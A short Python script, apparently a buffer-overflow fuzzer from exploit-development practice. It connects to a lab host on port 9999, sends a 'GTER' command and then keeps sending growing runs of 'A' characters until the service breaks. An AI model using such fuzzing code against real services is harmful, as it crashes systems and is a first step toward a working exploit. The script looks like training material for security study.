import socket

s = socket.socket()
s.connect(("192.168.0.102",9999))
payload = [
    b"A" *100
]
payload = b"".join(payload)
s.send(b"GTER ")

while True:
    s.send(payload)
    payload = payload + b"A" * 100
